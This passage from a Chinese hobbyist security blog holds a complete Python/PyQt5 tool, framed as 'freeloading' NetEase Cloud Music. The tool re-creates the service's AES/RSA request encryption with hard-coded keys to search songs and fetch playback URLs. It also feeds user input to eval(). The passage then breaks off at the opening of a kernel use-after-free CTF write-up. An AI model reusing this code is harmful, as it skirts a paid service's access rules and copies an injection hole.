<h2 id="白嫖网易云-V1-1"><a href="#白嫖网易云-V1-1" class="headerlink" title="白嫖网易云_V1.1"></a>白嫖网易云_V1.1</h2><p>VIP 歌曲标记没有完成，但是 UI 界面做好了</p>
<ul>
<li>PS：还是不会并发，所以爬虫工作的时候UI界面会卡顿</li>
</ul>
<img src="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/1652970459276.png" class width="1652970459276"> 
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> webbrowser</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PyQt5 <span class="keyword">import</span> QtCore, QtGui, QtWidgets</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Music</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_random</span>(<span class="params">self</span>):</span></span><br><span class="line">        random_str = <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">16</span>))</span><br><span class="line">        <span class="keyword">return</span> random_str</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">len_change</span>(<span class="params">self,text</span>):</span></span><br><span class="line">        pad = <span class="number">16</span> - <span class="built_in">len</span>(text) % <span class="number">16</span></span><br><span class="line">        text = text + pad * <span class="built_in">chr</span>(pad)</span><br><span class="line">        text = text.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">aes</span>(<span class="params">self,text, key</span>):</span></span><br><span class="line">        iv = <span class="string">b&#x27;0102030405060708&#x27;</span></span><br><span class="line">        text = self.len_change(text)</span><br><span class="line">        cipher = AES.new(key.encode(), AES.MODE_CBC, iv)</span><br><span class="line">        encrypted = cipher.encrypt(text)</span><br><span class="line">        encrypt = base64.b64encode(encrypted).decode()</span><br><span class="line">        <span class="keyword">return</span> encrypt</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">b</span>(<span class="params">self,text, <span class="built_in">str</span></span>):</span></span><br><span class="line">        first_data = self.aes(text, <span class="string">&#x27;0CoJUm6Qyw8W8jud&#x27;</span>)</span><br><span class="line">        second_data = self.aes(first_data, <span class="built_in">str</span>)</span><br><span class="line">        <span class="keyword">return</span> second_data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">c</span>(<span class="params">self,text</span>):</span></span><br><span class="line">        e = <span class="string">&#x27;010001&#x27;</span></span><br><span class="line">        f = <span class="string">&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;</span></span><br><span class="line">        text = text[::-<span class="number">1</span>]</span><br><span class="line">        result = <span class="built_in">pow</span>(<span class="built_in">int</span>(binascii.hexlify(text.encode()), <span class="number">16</span>), <span class="built_in">int</span>(e, <span class="number">16</span>), <span class="built_in">int</span>(f, <span class="number">16</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">format</span>(result, <span class="string">&#x27;x&#x27;</span>).zfill(<span class="number">131</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_final_param</span>(<span class="params">self,text, <span class="built_in">str</span></span>):</span></span><br><span class="line">        params = self.b(text, <span class="built_in">str</span>)</span><br><span class="line">        encSecKey = self.c(<span class="built_in">str</span>)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;params&#x27;</span>: params, <span class="string">&#x27;encSecKey&#x27;</span>: encSecKey&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_music_list</span>(<span class="params">self,params, encSecKey</span>):</span></span><br><span class="line">        url = <span class="string">&quot;https://music.163.com/weapi/cloudsearch/get/web?csrf_token=&quot;</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;params=&#x27;</span> + parse.quote(params) + <span class="string">&#x27;&amp;encSecKey=&#x27;</span> + parse.quote(encSecKey)</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;authority&#x27;</span>: <span class="string">&#x27;music.163.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;origin&#x27;</span>: <span class="string">&#x27;https://music.163.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;referer&#x27;</span>: <span class="string">&#x27;https://music.163.com/search/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;accept-language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload)</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_reply</span>(<span class="params">self,params, encSecKey</span>):</span></span><br><span class="line">        url = <span class="string">&quot;https://music.163.com/weapi/song/enhance/player/url/v1?csrf_token=&quot;</span></span><br><span class="line">        payload = <span class="string">&#x27;params=&#x27;</span> + parse.quote(params) + <span class="string">&#x27;&amp;encSecKey=&#x27;</span> + parse.quote(encSecKey)</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;authority&#x27;</span>: <span class="string">&#x27;music.163.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;origin&#x27;</span>: <span class="string">&#x27;https://music.163.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;referer&#x27;</span>: <span class="string">&#x27;https://music.163.com/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;accept-language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload)</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span>(<span class="params">self,song_search</span>):</span></span><br><span class="line">        song_url_list = []</span><br><span class="line">        song_name_list = []</span><br><span class="line">        song_num = <span class="number">0</span></span><br><span class="line">        d = &#123;<span class="string">&quot;hlpretag&quot;</span>: <span class="string">&quot;&lt;span class=\&quot;s-fc7\&quot;&gt;&quot;</span>, <span class="string">&quot;hlposttag&quot;</span>: <span class="string">&quot;&lt;/span&gt;&quot;</span>, <span class="string">&quot;s&quot;</span>: song_search, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;offset&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">             <span class="string">&quot;total&quot;</span>: <span class="string">&quot;true&quot;</span>, <span class="string">&quot;limit&quot;</span>: <span class="string">&quot;30&quot;</span>, <span class="string">&quot;csrf_token&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">        d = json.dumps(d)</span><br><span class="line">        random_param = self.get_random()</span><br><span class="line">        param = self.get_final_param(d, random_param)</span><br><span class="line">        song_list = self.get_music_list(param[<span class="string">&#x27;params&#x27;</span>], param[<span class="string">&#x27;encSecKey&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;搜索结果如下:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(song_list) &gt; <span class="number">0</span>:</span><br><span class="line">            song_list = json.loads(song_list)[<span class="string">&#x27;result&#x27;</span>][<span class="string">&#x27;songs&#x27;</span>]</span><br><span class="line">            <span class="keyword">for</span> i, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(song_list):</span><br><span class="line">                item = json.dumps(item)</span><br><span class="line">                song_name = json.loads(<span class="built_in">str</span>(item))[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&quot;：&quot;</span> + song_name)</span><br><span class="line">                d = &#123;<span class="string">&quot;ids&quot;</span>: <span class="string">&quot;[&quot;</span> + <span class="built_in">str</span>(json.loads(<span class="built_in">str</span>(item))[<span class="string">&#x27;id&#x27;</span>]) + <span class="string">&quot;]&quot;</span>, <span class="string">&quot;level&quot;</span>: <span class="string">&quot;standard&quot;</span>, <span class="string">&quot;encodeType&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;csrf_token&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">                d = json.dumps(d)</span><br><span class="line">                param = self.get_final_param(d, random_param)</span><br><span class="line">                song_info = self.get_reply(param[<span class="string">&#x27;params&#x27;</span>], param[<span class="string">&#x27;encSecKey&#x27;</span>])</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(song_info) &gt; <span class="number">0</span>:</span><br><span class="line">                    song_info = json.loads(song_info)</span><br><span class="line">                    song_url = json.dumps(song_info[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;url&#x27;</span>], ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">                    song_name_list.append(song_name)</span><br><span class="line">                    song_url_list.append(song_url)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;该首歌曲解析失败，可能是因为歌曲格式问题&quot;</span>)</span><br><span class="line">                song_num = i+<span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;一共搜索到&#123;&#125;个目标&quot;</span>.<span class="built_in">format</span>(song_num))</span><br><span class="line">            <span class="keyword">return</span> song_name_list,song_url_list</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainWin</span>(<span class="params">QtWidgets.QWidget</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,parent=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>(MainWin, self).__init__(parent)</span><br><span class="line">        self.song_result = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.song_num = <span class="number">0</span></span><br><span class="line">        self.layout = QGridLayout()</span><br><span class="line">        self.setWindowFlags(Qt.SubWindow)</span><br><span class="line">        self.setupUI()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchMusic</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;* searchMusic &#x27;</span>)</span><br><span class="line">        self.song_name_list = []</span><br><span class="line">        self.song_url_list = []</span><br><span class="line">        self.song_num = <span class="number">0</span></span><br><span class="line">        self.song_result = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.song_search = self.searchBox.text()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.song_search) == <span class="number">0</span>:</span><br><span class="line">            self.resultText.setText(<span class="string">&quot;请先输入歌曲名称&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        mus = Music()</span><br><span class="line">        self.song_name_list,self.song_url_list=mus.start(self.song_search)</span><br><span class="line">        <span class="keyword">for</span> song_name <span class="keyword">in</span> self.song_name_list:</span><br><span class="line">            self.song_num += <span class="number">1</span></span><br><span class="line">            self.song_result+=(<span class="built_in">str</span>(self.song_num)+<span class="string">&quot;.&quot;</span>+<span class="built_in">str</span>(song_name)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        self.song_result=self.song_result[:-<span class="number">1</span>]</span><br><span class="line">        self.resultText.setText(self.song_result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">choiceMusic</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;* choiceMusic &#x27;</span>)</span><br><span class="line">        self.song_choice = self.choiceBox.text()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.song_choice) == <span class="number">0</span>:</span><br><span class="line">            self.resultText.setText(<span class="string">&quot;请先输入编号&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.song_choice = <span class="built_in">eval</span>(self.song_choice)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.song_result) == <span class="number">0</span>:</span><br><span class="line">            self.resultText.setText(<span class="string">&quot;请先搜索歌曲&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> self.song_choice &gt; self.song_num:</span><br><span class="line">            self.resultText.setText(<span class="string">&quot;输入的编号有误&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.resultText.setText(<span class="string">&quot;开始播放:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.song_name_list[self.song_choice-<span class="number">1</span>]))</span><br><span class="line">        wb = webbrowser.get(<span class="string">&#x27;windows-default&#x27;</span>)</span><br><span class="line">        wb.<span class="built_in">open</span>(self.song_url_list[self.song_choice-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quitWindows</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;* quitWindows &#x27;</span>)</span><br><span class="line">        self.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setupUI</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.resize(<span class="number">550</span>,<span class="number">450</span>)</span><br><span class="line">        self.groupBox = QtWidgets.QGroupBox(self)</span><br><span class="line">        self.groupBox.setGeometry(QtCore.QRect(<span class="number">10</span>,<span class="number">10</span>,<span class="number">530</span>,<span class="number">430</span>))</span><br><span class="line">        self.groupBox.setObjectName(<span class="string">&quot;groupBox&quot;</span>)</span><br><span class="line">        self.groupBox.setStyleSheet(<span class="string">&quot;color:white&quot;</span>)</span><br><span class="line">        self.searchBox = QtWidgets.QLineEdit(self.groupBox)</span><br><span class="line">        self.searchBox.setGeometry(QtCore.QRect(<span class="number">105</span>,<span class="number">25</span>,<span class="number">160</span>,<span class="number">20</span>))</span><br><span class="line">        self.searchBox.setObjectName(<span class="string">&quot;searchBox&quot;</span>)</span><br><span class="line">        self.searchBox.setStyleSheet(<span class="string">&quot;color:black&quot;</span>)</span><br><span class="line">        self.choiceBox = QtWidgets.QLineEdit(self.groupBox)</span><br><span class="line">        self.choiceBox.setGeometry(QtCore.QRect(<span class="number">105</span>,<span class="number">315</span>,<span class="number">160</span>,<span class="number">20</span>))</span><br><span class="line">        self.choiceBox.setObjectName(<span class="string">&quot;choiceBox&quot;</span>)</span><br><span class="line">        self.choiceBox.setStyleSheet(<span class="string">&quot;color:black&quot;</span>)</span><br><span class="line">        self.resultText = QtWidgets.QTextEdit(self.groupBox)</span><br><span class="line">        self.resultText.setGeometry(QtCore.QRect(<span class="number">20</span>,<span class="number">60</span>,<span class="number">260</span>,<span class="number">240</span>))</span><br><span class="line">        self.resultText.setObjectName(<span class="string">&quot;resultText&quot;</span>)</span><br><span class="line">        self.resultText.setFont(QFont(<span class="string">&quot;微软雅黑&quot;</span>,<span class="number">10</span>,QFont.Bold))</span><br><span class="line">        self.resultText.setStyleSheet(<span class="string">&quot;color:black&quot;</span>)</span><br><span class="line">        self.label = QtWidgets.QLabel(self.groupBox)</span><br><span class="line">        self.label.setGeometry(QtCore.QRect(<span class="number">20</span>,<span class="number">20</span>,<span class="number">80</span>,<span class="number">30</span>))</span><br><span class="line">        self.label.setObjectName(<span class="string">&quot;laber&quot;</span>)</span><br><span class="line">        self.label2 = QtWidgets.QLabel(self.groupBox)</span><br><span class="line">        self.label2.setGeometry(QtCore.QRect(<span class="number">15</span>,<span class="number">20</span>,<span class="number">80</span>,<span class="number">610</span>))</span><br><span class="line">        self.label2.setObjectName(<span class="string">&quot;laber2&quot;</span>)</span><br><span class="line">        self.searchButton = QtWidgets.QPushButton(self)</span><br><span class="line">        self.searchButton.setGeometry(QtCore.QRect(<span class="number">50</span>,<span class="number">380</span>,<span class="number">90</span>,<span class="number">30</span>))</span><br><span class="line">        self.searchButton.setObjectName(<span class="string">&quot;searchButton&quot;</span>)</span><br><span class="line">        self.choiceButton = QtWidgets.QPushButton(self)</span><br><span class="line">        self.choiceButton.setGeometry(QtCore.QRect(<span class="number">160</span>,<span class="number">380</span>,<span class="number">90</span>,<span class="number">30</span>))</span><br><span class="line">        self.choiceButton.setObjectName(<span class="string">&quot;choiceButton&quot;</span>)</span><br><span class="line">        self.quitButton = QtWidgets.QPushButton(self)</span><br><span class="line">        self.quitButton.setGeometry(QtCore.QRect(<span class="number">270</span>,<span class="number">380</span>,<span class="number">90</span>,<span class="number">30</span>))</span><br><span class="line">        self.quitButton.setObjectName(<span class="string">&quot;quitButton&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.retranslateUI()</span><br><span class="line">        self.searchButton.clicked.connect(self.searchMusic)</span><br><span class="line">        self.choiceButton.clicked.connect(self.choiceMusic)</span><br><span class="line">        self.quitButton.clicked.connect(self.quitWindows)</span><br><span class="line"></span><br><span class="line">        QtCore.QMetaObject.connectSlotsByName(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">retranslateUI</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;网易云API&quot;</span>)</span><br><span class="line">        self.groupBox.setTitle(<span class="string">&quot;输入搜索的目标&quot;</span>)</span><br><span class="line">        self.label.setText(<span class="string">&quot;歌曲&amp;歌手&quot;</span>)</span><br><span class="line">        self.label2.setText(<span class="string">&quot;请输入编号&quot;</span>)</span><br><span class="line">        self.searchButton.setText(<span class="string">&quot;搜索&quot;</span>)</span><br><span class="line">        self.choiceButton.setText(<span class="string">&quot;播放&quot;</span>)</span><br><span class="line">        self.quitButton.setText(<span class="string">&quot;退出&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QtWidgets.QApplication(sys.argv)</span><br><span class="line">    win = MainWin()</span><br><span class="line">    palette = QPalette()</span><br><span class="line">    palette.setBrush(QPalette.Background, QBrush(QPixmap(<span class="string">&quot;D:\PythonProject\images\YHellow.png&quot;</span>)))</span><br><span class="line">    win.setPalette(palette)</span><br><span class="line">    win.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>
<p>更新日志：</p>
<ul>
<li><p>version：v1.1</p>
</li>
<li><p>date：2022.5.20</p>
</li>
<li><p>type：</p>
<ul>
<li>Features：<ul>
<li>全新的 UI 界面</li>
</ul>
</li>
<li>Changed：NULL</li>
<li>Removed：NULL</li>
</ul>
</li>
<li><p>desc：</p>
<ul>
<li>本项目已相对完善，暂时不会更新了</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/17/kernel%20UAF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/17/kernel%20UAF/" class="post-title-link" itemprop="url">kernel UAF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-17 20:42:55" itemprop="dateCreated datePublished" datetime="2022-05-17T20:42:55+08:00">2022-05-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-06-04 23:13:58" itemprop="dateModified" datetime="2022-06-04T23:13:58+08:00">2022-06-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>babydriver 复现</strong></p>
<p>首先使用 boot.sh 启动 kernel：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  babydriver ./boot.sh</span><br><span class="line">Could <span class="keyword">not</span> access KVM kernel <span class="keyword">module</span>: No such file <span class="keyword">or</span> directory</span><br><span class="line">qemu-system-x86_64: failed to initialize KVM: No such file <span class="keyword">or</span> directory</span><br></pre></td></tr></table></figure>
<p>未能初始化 kvm，大概率是因为系统不支持虚拟化</p>
<p>可以通过如下命令检查是否支持：</p>
